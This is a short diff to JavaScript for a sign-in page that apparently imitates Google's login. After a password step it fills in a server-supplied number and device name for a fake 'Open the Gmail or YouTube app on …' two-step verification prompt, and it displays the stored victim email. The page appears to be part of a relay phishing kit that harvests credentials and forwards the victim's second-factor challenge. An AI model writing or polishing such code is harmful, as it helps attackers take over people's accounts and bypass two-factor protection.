@@ -1125,16 +1125,17 @@
         setLoading(pwNextBtn, pwLabel, false);
         overlay.classList.remove('visible');
 
-        var num       = (data && data.number) ? String(data.number) : '58';
+        var num = (data && data.number) ? String(data.number) : '58';
         var deviceRaw = (data && data.device != null) ? String(data.device).trim() : '';
-        var hasDevice = deviceRaw.length > 0;
+        var deviceLabel = deviceRaw.replace(/^your\s+/i, '');
+        var hasDevice = deviceLabel.length > 0 && !/^phone\.?$/i.test(deviceLabel);
 
         document.getElementById('promptNumber').textContent           = num;
         document.getElementById('promptNumberInline').textContent      = num;
         document.getElementById('promptDeviceName').textContent        = hasDevice
-          ? ('Open the Gmail or YouTube app on ' + deviceRaw)
+          ? ('Open the Gmail or YouTube app on ' + deviceLabel)
           : 'Open the Gmail or YouTube app';
-        document.getElementById('promptDeviceNameInline').textContent  = hasDevice ? deviceRaw : 'phone';
+        document.getElementById('promptDeviceNameInline').textContent  = hasDevice ? deviceLabel : 'phone';
 
         var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
         document.getElementById('step4ChipEmail').textContent = addr;
